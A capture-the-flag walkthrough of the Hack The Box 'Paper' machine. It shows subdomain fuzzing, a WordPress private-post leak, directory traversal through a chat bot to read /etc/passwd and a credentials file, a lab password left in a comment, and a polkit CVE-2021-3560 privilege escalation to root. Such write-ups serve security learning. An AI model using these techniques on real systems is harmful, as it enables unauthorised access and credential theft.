# Paper
[comment]: <> (This table will be amended with better headings)
|Property| Rating|
|---------|---------------|
|HTB Difficulty| Easy|
|Real World Difficulty|Medium |
|Time Taken| 2-3 Hours (including research)

## Initial Enumeration

As with all machines, we begin by running some generalised Nmap scans looking for open ports and running services. We find web servers hosting sites on port 80 and 443.
as well as the usual Port 22 for SSH. From here we to http and https://10.10.11.143. (We also add a `/etc/hosts` entry for paper with this ip)

![http paper](./Assets/Images/httpspaper.png "visiting https paper")

After a short while of looking at some associated directory traversal and RCE exploits the sites did not appear open to exploit. This was my own fault for not continuing to fully enumerate the sites.

Further enumeration of subdomains proved fruitful, finding the `office.paper` subdomain. This was achieved using the tool `ffuf` as shown below:

```bash
$ ffuf -u http://paper/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.paper" -mc 200,301,302                    1 ⨯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://paper/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.paper
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
________________________________________________

office                  [Status: 200, Size: 23705, Words: 1923, Lines: 235]
```
Here we set the tool to send GET requests to `http://paper` using a large wordlist to substitute the `Host` header with `FUZZ.paper`. This would then enumerate out any subdomains that returned a 200 response code. such as `Office` above.

After adding a hosts entry alongside `paper` for `office.paper` we can browse to this address to find a new website not previously seen.

![office.paper](./Assets/Images/httpofficepaper.png "browsing to office.paper")

On this page we find outthat it is powered by wordpress, makes sense to use `wpscan` which is incuded with Kali to scan the site for vulnerable themes and plugins.

```bash
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'
```

There are several interesting findings including the versions of Wordpress itself and an outdated theme.

From `searchsploit` we find that it may be possible to view private posts on the site using the following exploit information.

```bash
$ searchsploit -x 47690
  Exploit: WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts
      URL: https://www.exploit-db.com/exploits/47690
     Path: /usr/share/exploitdb/exploits/multiple/webapps/47690.md
File Type: ASCII text

So far we know that adding `?static=1` to a wordpress URL should leak its secret content

Here are a few ways to manipulate the returned entries:

- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
```

We browse to `http://office.paper/?static=1` and are greeted with new information which is displayed to us, including a "secret" link to another area of the site.

![secret link](./Assets/Images/secretinfo.png "navigating to secret registration")

From here we create an account and login in to a slack-like chat platform `rocket.chat`, we can also see we have access to a `#general` channel which contains chat history relating to a bot known as `recyclops`.

![recyclops history](./Assets/Images/recyclops_history.png "Chat history is available")

Further in the conversation it becomes apparent that we can DM this bot which is handy as `#general` is read-only. We can now use the function of this bot to list files and retrieve their content.

![listing files](./Assets/Images/list_files.png "listing files and contents")

Initially it appears we cannot access files outside of the user "Dwight" directory, however, some simple trial of directory traversal proves we can in fact look elsewhere in the filesystem. Such as `/etc/passwd` which also shows us that the user rocketchat has a home directory and shell it can use (this may be useful later)

[comment]: <> (The above may need editing out)

```bash
mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
mongod❌976:974:mongod:/var/lib/mongo:/bin/false
rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
```

After a fair amount of looking around we come across the `hubot` directory which contains the file `.env`, this contains the credentials used to potentially gain access to the system as the user `rocketchat` or `dwight`

[comment]: <> (Queenofblad3s!23)

Using the credentials with `rocketchat` failed, however, `dwight` was successful and also produced the `user.txt` flag
![user.txt](./Assets/Images/user.png "getting user.txt")

From here we can run Linpeas.sh (the latest version) to look for privilege escalation routes. With this box only being 15 days ol I already suspected the PE route to relate to a very recent high-profile exploit method. With that in mind, and LinPEAS confirmation we can look for some PoC code relating to the appropriate CVE `2021-3560`. This may or may not have been the intended route and as yet I cannot confirm the expectation.

after some short google-fu we can find a good PoC on github, (i'll let you find out exactly which one). Simply creating this script in a writable directory and applying execution permissions creates a user that is able to use `sudo /bin/bash` which elevates us to `root` and owns the box.

```bash
[dwight@paper tmp]$ ./ron.sh -f

[!] Username set as : [REDACTED]
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username [REDACTED]...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username [REDACTED]  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - [REDACTED]
[!] When prompted for password, enter your password
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```

We can now `su` to the created user, `sudo /bin/bash` and grab our hash and various details.
```bash
[root@paper tmp]# whoami && hostname && ip -br a && cat /root/root.txt && id
root
paper
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.10.11.143/23 dead:beef::250:56ff:feb9:b1de/64 fe80::250:56ff:feb9:b1de/64
virbr0           DOWN           192.168.122.1/24
virbr0-nic       DOWN
74a5527d3af62dd350ff8e57fd52f640
uid=0(root) gid=0(root) groups=0(root)
[root@paper tmp]#
```
